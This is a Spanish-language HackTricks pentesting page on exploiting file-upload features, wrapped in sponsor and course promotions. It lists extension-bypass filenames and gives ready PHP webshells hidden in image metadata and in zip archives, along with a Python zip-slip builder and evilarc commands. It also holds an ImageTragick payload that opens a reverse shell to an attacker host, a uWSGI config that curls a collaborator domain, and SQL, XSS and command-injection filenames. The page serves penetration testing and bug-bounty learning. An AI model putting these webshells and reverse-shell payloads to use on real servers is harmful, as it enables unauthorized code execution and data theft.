# Carga de Archivos

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Consejo para cazar recompensas de bugs**: **reg√≠strate** en **Intigriti**, una plataforma premium de caza de recompensas creada por hackers, para hackers. √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Metodolog√≠a General de Carga de Archivos

Otras extensiones √∫tiles:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Trabajando en PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Servidor Web Erlang Yaws**: _.yaws_

### Evitar controles de extensiones de archivos

1. Si aplican, **verifica** las **extensiones anteriores.** Tambi√©n pru√©balas usando algunas **letras may√∫sculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifica **a√±adiendo una extensi√≥n v√°lida antes** de la extensi√≥n de ejecuci√≥n (usa tambi√©n las extensiones anteriores):_
* _file.png.php_
* _file.png.Php5_
3. Intenta agregar **caracteres especiales al final.** Podr√≠as usar Burp para **fuerza bruta** de todos los caracteres **ascii** y **Unicode**. (_Nota que tambi√©n puedes intentar usar las **extensiones mencionadas anteriormente**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Intenta evadir las protecciones **enga√±ando al analizador de extensiones** del lado del servidor con t√©cnicas como **duplicar** la **extensi√≥n** o **a√±adir basura** (**bytes nulos**) entre extensiones. _Tambi√©n puedes usar las **extensiones anteriores** para preparar un payload mejor._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. A√±ade **otra capa de extensiones** a la verificaci√≥n anterior:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Intenta poner la **extensi√≥n de ejecuci√≥n antes de la extensi√≥n v√°lida** y reza para que el servidor est√© mal configurado. (√∫til para explotar malas configuraciones de Apache donde cualquier cosa con extensi√≥n\*\* _**.php**_**, pero** no necesariamente terminando en .php\*\* ejecutar√° c√≥digo):
* _ej: file.php.png_
7. Usando **corrientes de datos alternas de NTFS (ADS)** en **Windows**. En este caso, se insertar√° un car√°cter de dos puntos ‚Äú:‚Äù despu√©s de una extensi√≥n prohibida y antes de una permitida. Como resultado, se crear√° un **archivo vac√≠o con la extensi√≥n prohibida** en el servidor (por ejemplo, ‚Äúfile.asax:.jpg‚Äù). Este archivo podr√≠a ser editado m√°s tarde usando otras t√©cnicas como usar su nombre corto. El patr√≥n ‚Äú**::$data**‚Äù tambi√©n puede usarse para crear archivos no vac√≠os. Por lo tanto, a√±adir un car√°cter de punto despu√©s de este patr√≥n tambi√©n podr√≠a ser √∫til para evadir restricciones adicionales (.e.g. ‚Äúfile.asp::$data.‚Äù)
8.  Intenta romper los l√≠mites del nombre del archivo. La extensi√≥n v√°lida se corta. Y el PHP malicioso queda. AAA<--SNIP-->AAA.php

```
# Linux m√°ximo 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # menos 4 aqu√≠ y a√±adiendo .png
# Sube el archivo y verifica la respuesta cu√°ntos caracteres permite. Digamos 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Haz el payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Evitar controles de Content-Type, N√∫mero M√°gico, Compresi√≥n y Redimensionamiento

* Evita controles de **Content-Type** estableciendo el **valor** del **encabezado Content-Type** a: _image/png_ , _text/plain , application/octet-stream_
1. Lista de palabras de Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Evita controles de **n√∫mero m√°gico** a√±adiendo al principio del archivo los **bytes de una imagen real** (confunde el comando _file_). O introduce la shell dentro de los **metadatos**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` o tambi√©n podr√≠as **introducir el payload directamente** en una imagen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Si se est√° **a√±adiendo compresi√≥n a tu imagen**, por ejemplo usando algunas bibliotecas est√°ndar de PHP como [PHP-GD](https://www.php.net/manual/fr/book.image.php), las t√©cnicas anteriores no ser√°n √∫tiles. Sin embargo, podr√≠as usar la t√©cnica del **chunk PLTE** [**definida aqu√≠**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para insertar texto que **sobreviva la compresi√≥n**.
* [**Github con el c√≥digo**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* La p√°gina web tambi√©n podr√≠a estar **redimensionando** la **imagen**, usando por ejemplo las funciones de PHP-GD `imagecopyresized` o `imagecopyresampled`. Sin embargo, podr√≠as usar la t√©cnica del **chunk IDAT** [**definida aqu√≠**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para insertar texto que **sobreviva la compresi√≥n**.
* [**Github con el c√≥digo**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Otra t√©cnica para hacer un payload que **sobreviva un redimensionamiento de imagen**, usando la funci√≥n de PHP-GD `thumbnailImage`. Sin embargo, podr√≠as usar la t√©cnica del **chunk tEXt** [**definida aqu√≠**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para insertar texto que **sobreviva la compresi√≥n**.
* [**Github con el c√≥digo**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Otros Trucos para Verificar

* Encuentra una vulnerabilidad para **renombrar** el archivo ya subido (para cambiar la extensi√≥n).
* Encuentra una vulnerabilidad de **Inclusi√≥n Local de Archivos** para ejecutar el backdoor.
* **Posible divulgaci√≥n de informaci√≥n**:
1. Sube **varias veces** (y al **mismo tiempo**) el **mismo archivo** con el **mismo nombre**
2. Sube un archivo con el **nombre** de un **archivo** o **carpeta** que **ya existe**
3. Subir un archivo con **‚Äú.‚Äù, ‚Äú..‚Äù, o ‚Äú‚Ä¶‚Äù como su nombre**. Por ejemplo, en Apache en **Windows**, si la aplicaci√≥n guarda los archivos subidos en el directorio ‚Äú/www/uploads/‚Äù, el nombre de archivo ‚Äú.‚Äù crear√° un archivo llamado ‚Äúuploads‚Äù en el directorio ‚Äú/www/‚Äù.
4. Sube un archivo que no pueda ser eliminado f√°cilmente como **‚Äú‚Ä¶:.jpg‚Äù** en **NTFS**. (Windows)
5. Sube un archivo en **Windows** con **caracteres inv√°lidos** como `|<>*?‚Äù` en su nombre. (Windows)
6. Sube un archivo en **Windows** usando **nombres reservados** (**prohibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, y LPT9.
* Intenta tambi√©n **subir un ejecutable** (.exe) o un **.html** (menos sospechoso) que **ejecutar√° c√≥digo** cuando sea abierto accidentalmente por la v√≠ctima.

### Trucos de extensiones especiales

Si est√°s intentando subir archivos a un servidor **PHP**, [echa un vistazo al truco de **.htaccess** para ejecutar c√≥digo](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Si est√°s intentando subir archivos a un servidor **ASP**, [echa un vistazo al truco de **.config** para ejecutar c√≥digo](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Los archivos `.phar` son como los `.jar` para java, pero para php, y pueden ser **usados como un archivo php** (ejecut√°ndolo con php, o incluy√©ndolo dentro de un script...)

La extensi√≥n `.inc` a veces se usa para archivos php que solo se utilizan para **importar archivos**, por lo que, en alg√∫n momento, alguien podr√≠a haber permitido **que esta extensi√≥n se ejecutara**.

## **Jetty RCE**

Si puedes subir un archivo XML a un servidor Jetty puedes obtener [RCE porque **nuevos \*.xml y \*.war se procesan autom√°ticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Por lo tanto, como se menciona en la siguiente imagen, sube el archivo XML a `$JETTY_BASE/webapps/` y espera la shell!

![](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Si puedes reemplazar el archivo de configuraci√≥n `.ini` de un servidor [**uWSGI puedes obtener RCE**](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)**.** De hecho, los archivos de configuraci√≥n de uWSGI pueden incluir ‚Äúvariables m√°gicas‚Äù, marcadores de posici√≥n y operadores definidos con una sintaxis precisa. El operador ‚Äò@‚Äô en particular se usa en la forma de @(nombre de archivo) para incluir el contenido de un archivo. Muchos esquemas de uWSGI son compatibles, incluyendo ‚Äúexec‚Äù - √∫til para leer la salida est√°ndar de un proceso. Estos operadores pueden ser armados para Ejecuci√≥n de Comandos Remotos o Escritura/Lectura de Archivos Arbitrarios cuando se analiza un archivo de configuraci√≥n .ini:

Ejemplo de archivo malicioso `uwsgi.ini`:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Cuando el archivo de **configuraci√≥n** sea **analizado**, el **payload** ser√° **ejecutado**. Ten en cuenta que para que la configuraci√≥n sea analizada, el **proceso necesita ser reiniciado** (¬øca√≠da? ¬øDoS?) o el archivo **recargado autom√°ticamente** (una opci√≥n que podr√≠a estar en uso indica los segundos para recargar el archivo si se encuentra un cambio).

**Nota Importante:** El an√°lisis del archivo de configuraci√≥n por uWSGI es laxo. El payload anterior puede estar incrustado dentro de un archivo binario (por ejemplo, imagen, pdf, ...).

## **Truco de Subida de Archivos/SSRF con wget**

En algunas ocasiones puedes encontrar que un servidor est√° utilizando **`wget`** para **descargar archivos** y puedes **indicar** la **URL**. En estos casos, el c√≥digo puede estar comprobando que la extensi√≥n de los archivos descargados est√© dentro de una lista blanca para asegurar que solo se descarguen archivos permitidos. Sin embargo, **esta comprobaci√≥n puede ser evitada.**\
La **longitud m√°xima** de un **nombre de archivo** en **linux** es de **255**, sin embargo, **wget** trunca los nombres de archivo a **236** caracteres. Puedes **descargar un archivo llamado "A"\*232+".php"+".gif"**, este nombre de archivo **evitar√°** la **comprobaci√≥n** (como en este ejemplo **".gif"** es una extensi√≥n **v√°lida**) pero `wget` **renombrar√°** el archivo a **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Tenga en cuenta que **otra opci√≥n** que podr√≠a estar pensando para eludir esta verificaci√≥n es hacer que el **servidor HTTP redirija a un archivo diferente**, de modo que la URL inicial eludir√° la verificaci√≥n, pero luego wget descargar√° el archivo redirigido con el nuevo nombre. Esto **no funcionar√°** **a menos que** wget se est√© utilizando con el **par√°metro** `--trust-server-names`, porque **wget descargar√° la p√°gina redirigida con el nombre del archivo indicado en la URL original**.

#### Otros recursos

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

## Herramientas

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) es una herramienta poderosa dise√±ada para asistir a Pentesters y cazadores de recompensas en pruebas de mecanismos de carga de archivos. Aprovecha varias t√©cnicas de recompensas por errores para simplificar el proceso de identificaci√≥n y explotaci√≥n de vulnerabilidades, asegurando evaluaciones exhaustivas de aplicaciones web.

## De la carga de archivos a otras vulnerabilidades

* Establezca **filename** a `../../../tmp/lol.png` e intente lograr un **path traversal**
* Establezca **filename** a `sleep(10)-- -.jpg` y podr√≠a lograr una **SQL injection**
* Establezca **filename** a `<svg onload=alert(document.domain)>` para lograr un XSS
* Establezca **filename** a `; sleep 10;` para probar alguna inyecci√≥n de comandos (m√°s trucos de inyecci√≥n de comandos [aqu√≠](../command-injection.md))
* [**XSS** en carga de archivos de imagen (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* Carga de archivo **JS** + **XSS** = [Explotaci√≥n de **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE en carga de svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** mediante la carga de archivos svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Pruebe **diferentes payloads de svg** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)****
* [Vulnerabilidad **ImageTrick** famosa](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Si puede **indicar al servidor web que capture una imagen de una URL**, podr√≠a intentar abusar de un [SSRF](../ssrf-server-side-request-forgery/). Si esta **imagen** va a ser **guardada** en alg√∫n sitio **p√∫blico**, tambi√©n podr√≠a indicar una URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) y **robar informaci√≥n de cada visitante**.
* [**XXE y CORS** bypass con carga de PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* PDFs especialmente dise√±ados para XSS: La [siguiente p√°gina presenta c√≥mo **inyectar datos en PDF para obtener ejecuci√≥n de JS**](../xss-cross-site-scripting/pdf-injection.md). Si puede cargar PDFs, podr√≠a preparar algunos PDF que ejecutar√°n JS arbitrario siguiendo las indicaciones dadas.
* Cargue el contenido de \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para verificar si el servidor tiene alg√∫n **antivirus**
* Verifique si hay alg√∫n **l√≠mite de tama√±o** al cargar archivos

Aqu√≠ hay una lista de las 10 principales cosas que puede lograr mediante la carga (de [enlace](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS almacenado / SSRF / XXE
3. **GIF**: XSS almacenado / SSRF
4. **CSV**: Inyecci√≥n de CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: Inyecci√≥n de HTML / XSS / Redirecci√≥n abierta
8. **PNG / JPEG**: Ataque de inundaci√≥n de p√≠xeles (DoS)
9. **ZIP**: RCE v√≠a LFI / DoS
10. **PDF / PPTX**: SSRF / XXE ciego

#### Extensi√≥n de Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Bytes de Encabezado M√°gico

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) para otros tipos de archivos.

### Carga de Archivos Zip/Tar Descomprimidos Autom√°ticamente

Si puede cargar un ZIP que va a ser descomprimido dentro del servidor, puede hacer 2 cosas:

#### Symlink

Cargue un enlace que contenga enlaces simb√≥licos a otros archivos, luego, al acceder a los archivos descomprimidos, acceder√° a los archivos vinculados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descompresi√≥n en diferentes carpetas

Los archivos descomprimidos se crear√°n en carpetas inesperadas.

Uno podr√≠a asumir f√°cilmente que esta configuraci√≥n protege contra la ejecuci√≥n de comandos a nivel de sistema operativo a trav√©s de cargas de archivos maliciosos, pero lamentablemente esto no es cierto. Dado que el formato de archivo ZIP admite compresi√≥n jer√°rquica y tambi√©n podemos hacer referencia a directorios de nivel superior, podemos escapar del directorio seguro de carga abusando de la funci√≥n de descompresi√≥n de la aplicaci√≥n objetivo.

Un exploit automatizado para crear este tipo de archivos se puede encontrar aqu√≠: [**https://github.com/ptoomey3/evilarc**](https://github.com/ptoomey3/evilarc)
```python
python2 evilarc.py -h
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Tambi√©n puedes usar el **truco de symlink con evilarc**, si la bandera est√° en `/flag.txt` aseg√∫rate de crear un **symlink a ese archivo** y **crear ese archivo en tu sistema** para que cuando llames a evilarc **no d√© error**.

Algunas l√≠neas de c√≥digo en python para crear un zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Para lograr la ejecuci√≥n remota de comandos, segu√≠ los siguientes pasos:

1. Crear un shell PHP:
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
1. Utilice "file spraying" y cree un archivo zip comprimido:
```
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3.Usa un editor hexadecimal o vi y cambia "xxA" por "../", yo us√© vi:
```
:set modifiable
:%s/xxA/..\//g
:x!
```
¬°Listo!

Solo quedaba un paso: ¬°Subir el archivo ZIP y dejar que la aplicaci√≥n lo descomprima! Si tiene √©xito y el servidor web tiene suficientes privilegios para escribir en los directorios, habr√° una simple shell de ejecuci√≥n de comandos del sistema operativo en el sistema:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**Referencia**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ImageTragic

Sube este contenido con una extensi√≥n de imagen para explotar la vulnerabilidad **(ImageMagick, 7.0.1-1)**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incrustaci√≥n de PHP Shell en PNG

La raz√≥n principal para poner un web shell en el chunk IDAT es que tiene la capacidad de evitar operaciones de cambio de tama√±o y re-muestreo - PHP-GD contiene dos funciones para hacer esto [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) y [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Lee este post: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Archivos Pol√≠glotas

Los pol√≠glotas, en un contexto de seguridad, son archivos que son una forma v√°lida de m√∫ltiples tipos de archivos diferentes. Por ejemplo, un [GIFAR](https://en.wikipedia.org/wiki/Gifar) es tanto un archivo GIF como RAR. Tambi√©n hay archivos que pueden ser tanto GIF y JS, tanto PPT y JS, etc.

Los archivos pol√≠glotas se utilizan a menudo para eludir la protecci√≥n basada en tipos de archivos. Muchas aplicaciones que permiten a los usuarios subir archivos solo permiten subidas de ciertos tipos, como JPEG, GIF, DOC, para evitar que los usuarios suban archivos potencialmente peligrosos como archivos JS, archivos PHP o archivos Phar.

Esto ayuda a subir un archivo que cumple con el formato de varios formatos diferentes. Puede permitirte subir un archivo PHAR (PHp ARchive) que tambi√©n parece un JPEG, pero probablemente todav√≠a necesitar√°s una extensi√≥n v√°lida y si la funci√≥n de subida no lo permite, esto no te ayudar√°.

M√°s informaci√≥n en: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo para cazar recompensas**: **reg√≠strate** en **Intigriti**, una plataforma premium de caza de recompensas creada por hackers, para hackers. √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**.

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
